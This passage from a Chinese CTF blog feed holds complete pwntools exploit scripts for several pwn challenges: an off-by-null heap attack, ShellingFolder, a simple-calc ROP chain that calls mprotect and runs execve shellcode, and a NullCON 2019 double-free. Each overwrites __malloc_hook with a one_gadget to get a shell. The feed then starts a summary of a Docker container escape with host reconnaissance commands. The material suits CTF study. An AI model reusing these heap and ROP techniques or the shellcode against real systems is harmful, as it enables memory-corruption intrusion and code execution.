<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">p, key</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;command:\n&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;row key:\n&#x27;</span>, key)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">put</span>(<span class="params">p, key, data</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;command:\n&#x27;</span>, <span class="string">&#x27;PUT&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;row key:\n&#x27;</span>, key)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size:\n&#x27;</span>, str(len(data)))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;data:\n&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">p, key</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;command:\n&#x27;</span>, <span class="string">&#x27;DEL&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;row key:\n&#x27;</span>, key)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span>(<span class="params">p</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;command:\n&#x27;</span>, <span class="string">&#x27;DUMP&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    p = process(<span class="string">&#x27;./datastore.elf&#x27;</span>)</span><br><span class="line">    elf = ELF(<span class="string">&#x27;./datastore.elf&#x27;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    put(p, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">    put(p, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">    put(p, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;c&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">    delete(p, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    delete(p, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    delete(p, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x1f0</span> + p64(<span class="number">0x200</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x280</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    put(p, <span class="string">&#x27;1&#x27;</span>, payload)</span><br><span class="line">    put(p, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x100</span>)</span><br><span class="line">    put(p, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">    delete(p, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    put(p, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">    put(p, <span class="string">&#x27;4&#x27;</span> * <span class="number">0x18</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x300</span>) <span class="comment"># off by null</span></span><br><span class="line">    delete(p, <span class="string">&#x27;th3fl4g&#x27;</span>)</span><br><span class="line">    put(p, <span class="string">&#x27;th3fl4g&#x27;</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x110</span>)</span><br><span class="line">    delete(p, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    put(p, <span class="string">&#x27;1&#x27;</span> * <span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x60</span>)</span><br><span class="line">    delete(p, <span class="string">&#x27;th3fl4g&#x27;</span>)</span><br><span class="line">    delete(p, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    put(p, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x110</span>)</span><br><span class="line"></span><br><span class="line">    get(p, <span class="string">&#x27;1&#x27;</span> * <span class="number">0x20</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;]:\n&#x27;</span>)</span><br><span class="line">    recv = p.recv(<span class="number">6</span>)</span><br><span class="line">    libc.address = u64(recv + <span class="string">&#x27;\x00\x00&#x27;</span>) - (<span class="number">0x7fbdacf7cb78</span> - <span class="number">0x00007fbdacbb8000</span>)</span><br><span class="line">    log.info(<span class="string">&#x27;libc:%s&#x27;</span>, hex(libc.address))</span><br><span class="line"></span><br><span class="line">    delete(p, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x110</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)</span><br><span class="line">    payload += <span class="number">0x68</span> * <span class="string">&#x27;a&#x27;</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">    put(p, <span class="string">&#x27;2&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">    delete(p, <span class="string">&#x27;1&#x27;</span> * <span class="number">0x20</span>)</span><br><span class="line">    delete(p, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x110</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x13</span>)</span><br><span class="line">    payload += <span class="number">0x68</span> * <span class="string">&#x27;a&#x27;</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">    put(p, <span class="string">&#x27;2&#x27;</span>, payload)</span><br><span class="line">    put(p, <span class="string">&#x27;1&#x27;</span> * <span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x60</span>)</span><br><span class="line">    payload = <span class="string">&#x27;\x00&#x27;</span> * <span class="number">3</span> + p64(libc.address + <span class="number">0x4526a</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x60</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    put(p, <span class="string">&#x27;5&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(p) </span></span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;command:\n&#x27;</span>, <span class="string">&#x27;PUT&#x27;</span>) <span class="comment">#getshell</span></span><br><span class="line">    p.interactive()</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>

<h2 id="HITCON-CTF-2016-Quals-ShellingFolder-2019-02-14"><a href="#HITCON-CTF-2016-Quals-ShellingFolder-2019-02-14" class="headerlink" title="HITCON CTF 2016 Quals ShellingFolder [2019.02.14]"></a>HITCON CTF 2016 Quals ShellingFolder [2019.02.14]</h2><p>在0x1334函数中存在信息泄露和任意地址写的漏洞，泄漏堆栈地址并将<code>__malloc_hook</code>改成<code>one_gadget</code>即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list_current</span>(<span class="params">p</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_current</span>(<span class="params">p, new_folder</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Folder :&#x27;</span>, new_folder)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_folder</span>(<span class="params">p, name</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Folder:&#x27;</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_file</span>(<span class="params">p, name, size</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;File:&#x27;</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;File:&#x27;</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span>(<span class="params">p, name</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;file :&#x27;</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span>(<span class="params">p</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="string">&#x27;6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    <span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    p = process(<span class="string">&#x27;./shellingfolder&#x27;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    create_file(p, <span class="string">&#x27;sunichi&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">    create_file(p, <span class="string">&#x27;sunichi1&#x27;</span>, <span class="number">-0x10</span>)</span><br><span class="line">    create_file(p, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x18</span> + <span class="string">&#x27;\x10&#x27;</span>, <span class="number">0x38</span>)</span><br><span class="line">    remove(p, <span class="string">&#x27;sunichi1&#x27;</span>)</span><br><span class="line">    calc(p)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;a&#x27;</span> * <span class="number">0x18</span>)</span><br><span class="line">    recv = p.recv(<span class="number">6</span>) + <span class="string">&#x27;\x00\x00&#x27;</span></span><br><span class="line">    heap_addr = u64(recv) - <span class="number">0x10</span></span><br><span class="line">    list_current(p)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;----------------------\n&#x27;</span>)</span><br><span class="line">    recv = p.recv(<span class="number">6</span>) + <span class="string">&#x27;\x00\x00&#x27;</span></span><br><span class="line">    libc.address = u64(recv) - (<span class="number">0x7f5885ba1b78</span> - <span class="number">0x7f58857dd000</span>)</span><br><span class="line">    log.info(<span class="string">&#x27;libc:%s&#x27;</span> % hex(libc.address))</span><br><span class="line">    one_gadget = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line">    create_folder(p, <span class="string">&#x27;getshell&#x27;</span>)</span><br><span class="line">    change_current(p, <span class="string">&#x27;getshell&#x27;</span>)</span><br><span class="line">    create_file(p, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>])[:<span class="number">6</span>], <span class="number">0x0</span>)    </span><br><span class="line">    change_current(p, <span class="string">&#x27;..&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    create_folder(p, <span class="string">&#x27;restore&#x27;</span>)</span><br><span class="line">    change_current(p, <span class="string">&#x27;restore&#x27;</span>)</span><br><span class="line">    create_file(p, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(heap_addr + <span class="number">0x10</span>)[:<span class="number">6</span>], <span class="number">0xd8</span><span class="number">-0x50</span>)</span><br><span class="line">    calc(p)</span><br><span class="line">    change_current(p, <span class="string">&#x27;..&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    remove(p, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x18</span> + <span class="string">&#x27;\x10&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    create_file(p, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(heap_addr + <span class="number">0x2cd</span>)[:<span class="number">6</span>], ord(p64(libc.address + one_gadget[<span class="number">2</span>])[<span class="number">5</span>]))</span><br><span class="line">    calc(p)</span><br><span class="line">    remove(p, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(heap_addr + <span class="number">0x2cd</span>)[:<span class="number">6</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        create_file(p, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(heap_addr + <span class="number">0x2cc</span> - i)[:<span class="number">6</span>], ord(p64(libc.address + one_gadget[<span class="number">2</span>])[<span class="number">4</span> - i]))</span><br><span class="line">        calc(p)</span><br><span class="line">        remove(p, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(heap_addr + <span class="number">0x2cc</span> - i)[:<span class="number">6</span>])</span><br><span class="line"></span><br><span class="line">    change_current(p, <span class="string">&#x27;getshell&#x27;</span>)</span><br><span class="line">    calc(p)</span><br><span class="line">    change_current(p, <span class="string">&#x27;..&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">&#x27;one_gadget:%s&#x27;</span> % hex(libc.address + one_gadget[<span class="number">2</span>]))</span><br><span class="line">    log.info(<span class="string">&#x27;heap:%s&#x27;</span> % hex(heap_addr))</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    </span><br><span class="line">    remove(p, <span class="string">&#x27;\x91&#x27;</span>) <span class="comment"># get shell  </span></span><br><span class="line">    p.interactive()</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>

<h2 id="Boston-Key-Party-2016-simple-calc-5-2019-02-15"><a href="#Boston-Key-Party-2016-simple-calc-5-2019-02-15" class="headerlink" title="Boston Key Party 2016 simple-calc-5 [2019.02.15]"></a>Boston Key Party 2016 simple-calc-5 [2019.02.15]</h2><p>保存结果时存在复制后栈溢出，可以ROP，但程序静态编译，需要ROP到<code>mprotect</code>将部分内存修改为<code>wx</code>属性来ret2shellcode。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">p, num1, num2</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;=&gt; &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;x: &#x27;</span>, str(num1))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;y: &#x27;</span>, str(num2))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">subs</span>(<span class="params">p, num1, num2</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;=&gt; &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;x: &#x27;</span>, str(num1))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;y: &#x27;</span>, str(num2))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_zero</span>(<span class="params">p</span>):</span></span><br><span class="line">    subs(p, <span class="number">0x2000</span>, <span class="number">0x2000</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    p = process(<span class="string">&#x27;./calc&#x27;</span>)</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;calculations: &#x27;</span>, <span class="string">&#x27;100&#x27;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p, gdbscript=&#x27;b *0x401588&#x27;)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x6</span>):</span><br><span class="line">        add(p, <span class="number">0xbead</span>, <span class="number">0x2000</span>)</span><br><span class="line">        add(p, <span class="number">0xbead</span>, <span class="number">0x2000</span>)</span><br><span class="line">    </span><br><span class="line">    set_zero(p)</span><br><span class="line">    set_zero(p)</span><br><span class="line">    add(p, <span class="number">0xbead</span>, <span class="number">0x2000</span>)</span><br><span class="line">    add(p, <span class="number">0xbead</span>, <span class="number">0x2000</span>)</span><br><span class="line">    <span class="comment"># saved rbp</span></span><br><span class="line">    add(p, <span class="number">0x6c0000</span>, <span class="number">0x5800</span>)</span><br><span class="line">    set_zero(p)</span><br><span class="line">    <span class="comment"># pop rdi; ret</span></span><br><span class="line">    add(p, <span class="number">0x400000</span>, <span class="number">0x1b73</span>)</span><br><span class="line">    set_zero(p)</span><br><span class="line">    add(p, <span class="number">0x6c0000</span>, <span class="number">0x5000</span>)</span><br><span class="line">    set_zero(p)</span><br><span class="line">    <span class="comment"># pop rsi; ret</span></span><br><span class="line">    add(p, <span class="number">0x400000</span>, <span class="number">0x1c87</span>)</span><br><span class="line">    set_zero(p)</span><br><span class="line">    add(p, <span class="number">0x800</span>, <span class="number">0x800</span>)</span><br><span class="line">    set_zero(p)  </span><br><span class="line">    <span class="comment"># pop rdx; ret</span></span><br><span class="line">    add(p, <span class="number">0x400000</span>, <span class="number">0x37a85</span>)</span><br><span class="line">    set_zero(p)</span><br><span class="line">    subs(p, <span class="number">0x807</span>, <span class="number">0x800</span>)</span><br><span class="line">    set_zero(p)       </span><br><span class="line">    <span class="comment"># call mprotect</span></span><br><span class="line">    add(p, <span class="number">0x400000</span>, <span class="number">0x35690</span>)</span><br><span class="line">    set_zero(p)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># call read</span></span><br><span class="line">    <span class="comment"># pop rdi; ret</span></span><br><span class="line">    add(p, <span class="number">0x400000</span>, <span class="number">0x1b73</span>)</span><br><span class="line">    set_zero(p)</span><br><span class="line">    set_zero(p)</span><br><span class="line">    set_zero(p)</span><br><span class="line">    <span class="comment"># pop rsi; ret</span></span><br><span class="line">    add(p, <span class="number">0x400000</span>, <span class="number">0x1c87</span>)</span><br><span class="line">    set_zero(p)</span><br><span class="line">    add(p, <span class="number">0x6c0000</span>, <span class="number">0x5e00</span>)</span><br><span class="line">    set_zero(p)  </span><br><span class="line">    <span class="comment"># pop rdx; ret</span></span><br><span class="line">    add(p, <span class="number">0x400000</span>, <span class="number">0x37a85</span>)</span><br><span class="line">    set_zero(p)</span><br><span class="line">    subs(p, <span class="number">0x900</span>, <span class="number">0x800</span>)</span><br><span class="line">    set_zero(p)  </span><br><span class="line">    <span class="comment"># call read</span></span><br><span class="line">    add(p, <span class="number">0x400000</span>, <span class="number">0x34b20</span>)</span><br><span class="line">    set_zero(p)</span><br><span class="line">    <span class="comment"># ret2shellcode</span></span><br><span class="line">    add(p, <span class="number">0x6c0000</span>, <span class="number">0x5e00</span>)</span><br><span class="line">    set_zero(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;=&gt; &#x27;</span>, <span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    shellcode = <span class="string">&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">    p.sendline(shellcode)</span><br><span class="line">    p.interactive()</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>

<h2 id="HITCON-2016-babyheap-2019-02-18"><a href="#HITCON-2016-babyheap-2019-02-18" class="headerlink" title="HITCON 2016 babyheap [2019.02.18]"></a>HITCON 2016 babyheap [2019.02.18]</h2><h2 id="NullCON-2019-shop-2019-02-21"><a href="#NullCON-2019-shop-2019-02-21" class="headerlink" title="NullCON 2019 shop [2019.02.21]"></a>NullCON 2019 shop [2019.02.21]</h2><p><code>use after free</code>漏洞，通过<code>double free</code>可以泄漏got表信息、获取libc。修改<code>__malloc_hook</code>即可getshell。也有wp通过格式化字符串漏洞实现信息泄露。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span>(<span class="params">p, size, name</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;length: &#x27;</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;name: &#x27;</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;price: &#x27;</span>, <span class="string">&#x27;17&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">p, idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span>(<span class="params">p</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    p = process(<span class="string">&#x27;./challenge&#x27;</span>)</span><br><span class="line">    elf = ELF(<span class="string">&#x27;./challenge&#x27;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    new(p, <span class="number">0x60</span>, <span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">    new(p, <span class="number">0x60</span>, <span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">    new(p, <span class="number">0x60</span>, <span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">    new(p, <span class="number">0x30</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    new(p, <span class="number">0x60</span>, <span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">    new(p, <span class="number">0x60</span>, <span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">    new(p, <span class="number">0x60</span>, <span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    delete(p, <span class="number">0</span>)</span><br><span class="line">    delete(p, <span class="number">1</span>)</span><br><span class="line">    delete(p, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">    new(p, <span class="number">0x30</span>, payload)</span><br><span class="line"></span><br><span class="line">    view(p) <span class="comment"># get puts address</span></span><br><span class="line">    delete(p, <span class="number">2</span>)</span><br><span class="line">    delete(p, <span class="number">0</span>)    </span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(elf.got[<span class="string">&#x27;fgets&#x27;</span>])</span><br><span class="line">    new(p, <span class="number">0x30</span>, payload)</span><br><span class="line">    <span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">    view(p) <span class="comment"># get fgets address</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&quot;name&quot;: &quot;&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&quot;name&quot;: &quot;&#x27;</span>)</span><br><span class="line">    recv = p.recv(<span class="number">6</span>) + <span class="string">&#x27;\x00\x00&#x27;</span></span><br><span class="line">    libc.address = u64(recv) - (<span class="number">0x7fbe1d061ad0</span> - <span class="number">0x00007fbe1cff4000</span>)</span><br><span class="line">    <span class="comment"># get libc</span></span><br><span class="line">    log.info(<span class="string">&#x27;libc:%s&#x27;</span> % hex(libc.address))</span><br><span class="line">    delete(p, <span class="number">3</span>)</span><br><span class="line">    delete(p, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    new(p, <span class="number">0x60</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    new(p, <span class="number">0x60</span>, p64(libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x13</span>))</span><br><span class="line">    new(p, <span class="number">0x60</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    new(p, <span class="number">0x60</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;\x7f\x00\x00&#x27;</span> + p64(libc.address + <span class="number">0xf02a4</span>)</span><br><span class="line">    new(p, <span class="number">0x60</span>, payload)</span><br><span class="line">    </span><br><span class="line">    delete(p, <span class="number">0</span>) <span class="comment"># get shell</span></span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    p.interactive()</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>

<h2 id="NullCON-2019-babypwn-2019-02-28"><a href="#NullCON-2019-babypwn-2019-02-28" class="headerlink" title="NullCON 2019 babypwn [2019.02.28]"></a>NullCON 2019 babypwn [2019.02.28]</h2><p>格式化字符串和有、无符号数的比较两个漏洞。虽然能够溢出，但是程序开启了<code>canary</code>保护，需要想办法规避。看了其他人的wp才知道，对于</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, ...)</span><br></pre></td></tr></table></figure>

<p>来说，如果用户输入字符<code>-</code>或<code>+</code>，<code>scanf</code>函数不会改变相应变量的值。涨知识了。绕过<code>canary</code>后就是常规的格式化字符串漏洞了。</p>
<p>原文：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">This requires knowledge of a cool scanf trick. When scanf is called like so:</span><br><span class="line">scanf(&quot;%d&quot;, ...);</span><br><span class="line">You can provide the characters - or +, and the scanf will not change the value of the variable.</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2019</tag>
      </tags>
  </entry>
  <entry>
    <title>【CYBERARK】容器逃逸实践</title>
    <url>/2020/02/16/cyberark-docker-escape/</url>
    <content><![CDATA[<p>CYBERARK一篇关于实际的Docker逃逸文章。</p>
<a id="more"></a>

<blockquote>
<p><a href="https://www.cyberark.com/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host/">https://www.cyberark.com/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host/</a></p>
</blockquote>
<h2 id="0x00-知己知彼"><a href="#0x00-知己知彼" class="headerlink" title="0x00 知己知彼"></a>0x00 知己知彼</h2><p>了解系统内核：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[node1] $ uname –a</span><br><span class="line">Linux node1 4.4.0-96-generic <span class="comment">#119-Ubuntu SMP Tue Sep 12 14:59:54 UTC 2017 x86_64 Linux</span></span><br></pre></td></tr></table></figure>

<p>通过uname指令能够获取宿主内核版本、架构、主机名和编译日期。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[node1] $ cat /proc/cmdline</span><br><span class="line">BOOT_IMAGE=/boot/vmlinuz-4.4.0-96-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300</span><br></pre></td></tr></table></figure>
